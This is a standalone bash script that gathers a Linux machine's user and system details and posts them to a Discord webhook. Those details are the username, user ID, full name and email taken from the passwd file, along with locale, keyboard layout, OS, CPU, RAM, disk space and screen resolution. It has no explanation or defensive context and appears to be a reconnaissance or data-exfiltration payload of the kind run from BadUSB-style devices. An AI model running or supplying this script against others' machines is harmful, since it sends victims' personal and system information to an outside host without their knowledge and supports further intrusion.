#!/bin/bash

# Discord webhook URL
hookurl="$dc"

# Send a notification to Discord on start
hostname=$(hostname)
jsonsys=$(jq -n --arg username "$hostname" --arg content ":computer: \`\`Gathering System Information for $hostname\`\` :computer:" '{username: $username, content: $content}')
curl -H "Content-Type: application/json" -X POST -d "$jsonsys" "$hookurl"

# Gather user information
username=$(whoami)
user_id=$(id -u)
full_name=$(getent passwd "$username" | cut -d ':' -f 5 | cut -d ',' -f 1)
email=$(getent passwd "$username" | cut -d ':' -f 5 | cut -d ',' -f 2)

# Gather system locale
system_locale=$(locale | grep LANG= | cut -d '=' -f 2)

# Get keyboard layout
keyboard_layout=$(setxkbmap -query | grep layout | awk '{print $2}')

# Get OS information
os_name=$(lsb_release -d | cut -f2)
os_version=$(lsb_release -r | cut -f2)
os_arch=$(uname -m)

# Get screen resolution
screen_resolution=$(xrandr | grep '*' | awk '{print $1}')

# Get CPU information
cpu_info=$(lscpu | grep "Model name" | cut -d ':' -f2 | xargs)

# Get total RAM
total_ram=$(free -h | grep Mem | awk '{print $2}')

# Get disk space usage
disk_usage=$(df -h / | grep / | awk '{print $4}')

# Prepare JSON payload with all the gathered information
jsonpayload=$(jq -n \
    --arg username "$username" \
    --arg full_name "$full_name" \
    --arg email "$email" \
    --arg system_locale "$system_locale" \
    --arg keyboard_layout "$keyboard_layout" \
    --arg os_name "$os_name" \
    --arg os_version "$os_version" \
    --arg os_arch "$os_arch" \
    --arg screen_resolution "$screen_resolution" \
    --arg cpu_info "$cpu_info" \
    --arg total_ram "$total_ram" \
    --arg disk_usage "$disk_usage" \
    '{
        "username": $username,
        "full_name": $full_name,
        "email": $email,
        "system_locale": $system_locale,
        "keyboard_layout": $keyboard_layout,
        "os_name": $os_name,
        "os_version": $os_version,
        "os_arch": $os_arch,
        "screen_resolution": $screen_resolution,
        "cpu_info": $cpu_info,
        "total_ram": $total_ram,
        "disk_usage": $disk_usage
    }')

# Send the full system information to Discord
curl -H "Content-Type: application/json" -X POST -d "$jsonpayload" "$hookurl"

# Output information for debugging
echo "System information sent to Discord successfully."

# Sleep for a bit
sleep 1
